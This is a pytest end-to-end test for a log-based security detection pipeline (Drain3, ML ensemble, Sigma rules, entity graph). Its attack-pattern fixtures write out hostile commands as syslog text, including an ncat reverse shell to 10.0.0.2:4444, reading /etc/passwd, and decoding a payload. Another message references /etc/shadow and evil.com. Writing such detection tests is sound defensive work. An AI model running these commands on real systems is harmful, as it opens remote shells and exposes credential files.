"""End-to-end pipeline integration test.

Tests the full flow: RawEvent -> Drain3 -> ML scoring -> Sigma detection -> Alert -> Storage.
Injects events directly into the handler (no network I/O).

NOTE on Sigma detection: The EventNormalizer does not currently set
``log_source_category`` / ``log_source_product`` / ``log_source_service``
on normalised events. All bundled Sigma rules have logsource keys like
(``process_creation``, ``linux``, ``""``) or (``""``, ``linux``, ``""``),
so the SigmaEngine hierarchical lookup never finds candidates for
normalised syslog events. Sigma alerts will only fire when the normaliser
is extended to populate logsource fields (tracked as follow-up work).
"""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

import pytest

from seerflow.config import load_config
from seerflow.correlation.holders import EngineHolder
from seerflow.detection.ensemble import DetectionEnsemble
from seerflow.models.query import AlertQuery, EventQuery
from seerflow.pipeline.handler import _make_handler
from seerflow.receivers.base import RawEvent
from seerflow.sigma.engine import SigmaEngine
from seerflow.storage.sqlite import SqliteBackend

if TYPE_CHECKING:
    from pathlib import Path

pytestmark = pytest.mark.e2e


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _raw(message: str, source_type: str = "syslog") -> RawEvent:
    """Create a RawEvent from a log message string."""
    return RawEvent(
        data=message.encode(),
        source_type=source_type,
        source_id=f"{source_type}-test",
        received_ns=time.time_ns(),
        metadata={},
    )


async def _flush(storage: SqliteBackend) -> None:
    """Flush the write buffer so events/alerts are queryable."""
    await storage.flush()


# Normal syslog messages (RFC 5424 format) for ML warmup
_NORMAL_MESSAGES = [
    f"<134>1 2026-03-28T{10 + i // 60:02d}:{i % 60:02d}:00Z web nginx {i} - - "
    f"GET /api/v1/health 200 {10 + i}ms"
    for i in range(50)
]

# Attack-pattern messages that should trigger Sigma rules when logsource
# fields are populated.  Until the normaliser sets logsource fields, these
# serve as regression markers -- the full pipeline must process them without
# crashing, and the ML ensemble still scores them.
_ATTACK_MESSAGES = [
    "<134>1 2026-03-28T11:00:00Z server1 bash 1001 - - bash -c whoami",
    "<134>1 2026-03-28T11:00:01Z server1 sshd 1002 - - "
    "Failed password for root from 10.0.0.1 port 22 ssh2",
    "<134>1 2026-03-28T11:00:02Z server1 bash 1003 - - cat /etc/passwd",
    "<134>1 2026-03-28T11:00:03Z server1 bash 1004 - - base64 -d /tmp/payload",
    "<134>1 2026-03-28T11:00:04Z server1 bash 1005 - - ncat -e /bin/bash 10.0.0.2 4444",
]


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
async def e2e_env(tmp_path: Path) -> tuple[SqliteBackend, object]:
    """Build a complete pipeline environment: storage + ensemble + sigma + handler."""
    config_yaml = tmp_path / "seerflow.yaml"
    config_yaml.write_text(
        "storage:\n"
        f"  data_dir: {tmp_path}\n"
        "receivers:\n"
        "  syslog_enabled: false\n"
        "  otlp_grpc_enabled: false\n"
        "  otlp_http_enabled: false\n"
        "  webhook_enabled: false\n"
    )
    config = load_config(str(config_yaml))
    storage = await SqliteBackend.connect(config.storage)
    ensemble = DetectionEnsemble(config.detection)
    sigma = SigmaEngine()
    sigma.load_bundled()

    handler = _make_handler(
        ensemble,
        storage,
        save_interval_ns=999_999_999_999,
        sigma_holder=EngineHolder(engine=sigma),
    )
    try:
        yield storage, handler
    finally:
        await storage.close()


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


class TestE2EPipeline:
    """End-to-end integration tests for the full Seerflow pipeline."""

    async def test_full_pipeline_processes_events(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """All events flow through the full pipeline and are persisted."""
        storage, handler = e2e_env

        for msg in _NORMAL_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]
        for msg in _ATTACK_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)

        result = await storage.query_events(EventQuery(limit=100))
        assert result.total >= len(_NORMAL_MESSAGES) + len(_ATTACK_MESSAGES)

    async def test_drain3_extracts_templates(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """Drain3 extracts log templates from at least some events."""
        storage, handler = e2e_env

        for msg in _NORMAL_MESSAGES[:20]:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)

        result = await storage.query_events(EventQuery(limit=20))
        templated = [e for e in result.items if e.template_id != -1]
        assert len(templated) > 0, "Drain3 should extract at least one template"

    async def test_ml_produces_scores(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """ML ensemble processes events without crashing."""
        storage, handler = e2e_env

        for msg in _NORMAL_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)

        result = await storage.query_events(EventQuery(limit=100))
        # Verify at least 50 events were processed by the ensemble (no crash).
        assert result.total >= 50

    async def test_sigma_evaluation_runs_without_crash(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """Sigma engine evaluates attack events without raising.

        The normaliser does not currently set logsource fields, so bundled
        rules will not match. This test verifies the evaluation path is
        exercised without crashing. When the normaliser is extended to
        populate logsource fields, this test should be updated to assert
        that sigma alerts are created.
        """
        storage, handler = e2e_env

        for msg in _ATTACK_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)

        # Verify events were stored (pipeline did not crash)
        result = await storage.query_events(EventQuery(limit=20))
        assert result.total == len(_ATTACK_MESSAGES)

        # Check sigma alerts -- currently expected to be 0 because
        # EventNormalizer does not set logsource fields.
        alert_result = await storage.query_alerts(AlertQuery(alert_type="sigma", limit=50))
        # When normaliser is updated to set logsource fields, change to:
        #   assert alert_result.total >= 1
        assert alert_result.total == 0, (
            "Expected 0 sigma alerts until EventNormalizer sets logsource fields"
        )

    async def test_multi_source_events(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """Events from different source types are all processed and stored."""
        storage, handler = e2e_env

        sources = ["syslog", "file", "webhook"]
        for source in sources:
            msg = f"<134>1 2026-03-28T12:00:00Z host app 1 - - Normal log from {source}"
            await handler(_raw(msg, source_type=source))  # type: ignore[operator]

        await _flush(storage)

        result = await storage.query_events(EventQuery(limit=10))
        stored_sources = {e.source_type for e in result.items}
        for expected in sources:
            assert expected in stored_sources, f"Missing source_type: {expected}"

    async def test_alerts_queryable_after_pipeline(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """Alerts (if any) are persisted and queryable via the storage layer."""
        storage, handler = e2e_env

        for msg in _NORMAL_MESSAGES[:10]:
            await handler(_raw(msg))  # type: ignore[operator]
        for msg in _ATTACK_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)

        # If any sigma alerts exist, verify their type.
        sigma_result = await storage.query_alerts(AlertQuery(alert_type="sigma", limit=50))
        for alert in sigma_result.items:
            assert alert.alert_type == "sigma"

    async def test_pipeline_completes_under_30_seconds(
        self,
        e2e_env: tuple[SqliteBackend, object],
    ) -> None:
        """Full pipeline processes 55 events well within the 30-second budget."""
        storage, handler = e2e_env

        start = time.time()
        for msg in _NORMAL_MESSAGES + _ATTACK_MESSAGES:
            await handler(_raw(msg))  # type: ignore[operator]

        await _flush(storage)
        elapsed = time.time() - start

        assert elapsed < 30.0, f"Pipeline took {elapsed:.1f}s, budget is 30s"


# ---------------------------------------------------------------------------
# 6-type entity pipeline test (standalone, not inside TestE2EPipeline class)
# ---------------------------------------------------------------------------


@pytest.mark.e2e
async def test_six_type_entities_flow_through_pipeline(tmp_path: Path) -> None:
    """All 6 entity types (ip, user, host, file, domain, process) should be
    extracted, resolved to UUID5, and produce graph edges after pipeline processing.
    """

    from seerflow.graph.entity_graph import EntityGraph

    config_yaml = tmp_path / "seerflow.yaml"
    config_yaml.write_text(
        "storage:\n"
        f"  data_dir: {tmp_path}\n"
        "receivers:\n"
        "  syslog_enabled: false\n"
        "  otlp_grpc_enabled: false\n"
        "  otlp_http_enabled: false\n"
        "  webhook_enabled: false\n"
    )
    config = load_config(str(config_yaml))
    storage = await SqliteBackend.connect(config.storage)
    ensemble = DetectionEnsemble(config.detection)
    sigma = SigmaEngine()
    sigma.load_bundled()
    graph = EntityGraph()

    handler = _make_handler(
        ensemble,
        storage,
        save_interval_ns=999_999_999_999,
        sigma_holder=EngineHolder(engine=sigma),
        entity_graph=graph,
    )

    # Message containing all 6 entity types:
    # process: sshd[1234]  user: admin  host: web-01  ip: 10.0.1.1
    # file: /etc/shadow    domain: evil.com
    message = "sshd[1234]: user=admin host=web-01 from 10.0.1.1 reading /etc/shadow query evil.com"
    await handler(_raw(message))
    await _flush(storage)

    result = await storage.query_events(EventQuery(limit=10))
    assert result.total == 1
    event = result.items[0]

    # --- Entity field assertions ---
    assert "10.0.1.1" in event.related_ips, f"expected IP in {event.related_ips}"
    assert "admin" in event.related_users, f"expected user in {event.related_users}"
    assert "web-01" in event.related_hosts, f"expected host in {event.related_hosts}"
    assert "/etc/shadow" in event.related_files, f"expected file in {event.related_files}"
    assert "evil.com" in event.related_domains, f"expected domain in {event.related_domains}"
    assert any("sshd" in p for p in event.related_processes), (
        f"expected sshd process in {event.related_processes}"
    )

    # --- entity_refs must be populated (UUID5 strings) ---
    assert len(event.entity_refs) >= 6, (
        f"expected at least 6 entity_refs, got {len(event.entity_refs)}: {event.entity_refs}"
    )

    # --- Graph must have edges (cross-type entity pairs) ---
    # Vertices only appear when they participate in an edge.  The EDGE_TYPE_MAP
    # covers user↔ip, user↔host, ip↔host, user↔file, ip↔domain — so ip, user,
    # host, file, and domain each appear as a vertex (5 total).  The process
    # entity has no mapped pair in v1, so it does not appear in the graph.
    assert graph.vertex_count >= 5, f"expected >= 5 graph vertices, got {graph.vertex_count}"
    assert graph.edge_count >= 4, f"expected >= 4 graph edges, got {graph.edge_count}"

    await storage.close()


# ---------------------------------------------------------------------------
# EntityStore integration test (timeline + related)
# ---------------------------------------------------------------------------


@pytest.mark.e2e
async def test_entity_store_timeline_and_related(tmp_path: Path) -> None:
    """EntityStore queries: get_timeline returns events for an entity,
    get_related returns graph neighbors."""

    from seerflow.graph.entity_graph import EntityGraph
    from seerflow.models.entity import generate_ip_id, generate_user_id
    from seerflow.models.query import TimeRange
    from seerflow.storage.protocols import EntityStore

    config_yaml = tmp_path / "seerflow.yaml"
    config_yaml.write_text(
        "storage:\n"
        f"  data_dir: {tmp_path}\n"
        "receivers:\n"
        "  syslog_enabled: false\n"
        "  otlp_grpc_enabled: false\n"
        "  otlp_http_enabled: false\n"
        "  webhook_enabled: false\n"
    )
    config = load_config(str(config_yaml))
    storage = await SqliteBackend.connect(config.storage)
    ensemble = DetectionEnsemble(config.detection)
    sigma = SigmaEngine()
    sigma.load_bundled()
    entity_graph = EntityGraph()

    storage.set_entity_graph(entity_graph)

    handler = _make_handler(
        ensemble,
        storage,
        save_interval_ns=999_999_999_999,
        sigma_holder=EngineHolder(engine=sigma),
        entity_graph=entity_graph,
    )

    # Message that creates a known user + IP pair
    message = "sshd[1234]: user=admin host=web-01 from 10.0.1.1 Failed password"
    before_ns = time.time_ns()
    await handler(_raw(message))
    after_ns = time.time_ns()
    await _flush(storage)

    # Derive entity UUIDs the same way the pipeline does
    user_uuid = str(generate_user_id("admin", ""))
    ip_uuid = str(generate_ip_id("10.0.1.1"))

    # --- get_timeline: should return the event we just processed ---
    time_range = TimeRange(start_ns=before_ns - 1, end_ns=after_ns + 1)
    timeline = await storage.get_timeline(user_uuid, time_range)
    assert len(timeline) >= 1, f"expected >= 1 event in timeline, got {len(timeline)}"

    # --- get_related: graph neighbor (user → ip edge) should be returned ---
    related = await storage.get_related(user_uuid)
    assert any(r.entity_uuid == ip_uuid for r in related), (
        f"expected IP {ip_uuid} in related entities, got {related}"
    )

    # --- isinstance check: SqliteBackend satisfies EntityStore Protocol ---
    assert isinstance(storage, EntityStore)

    await storage.close()
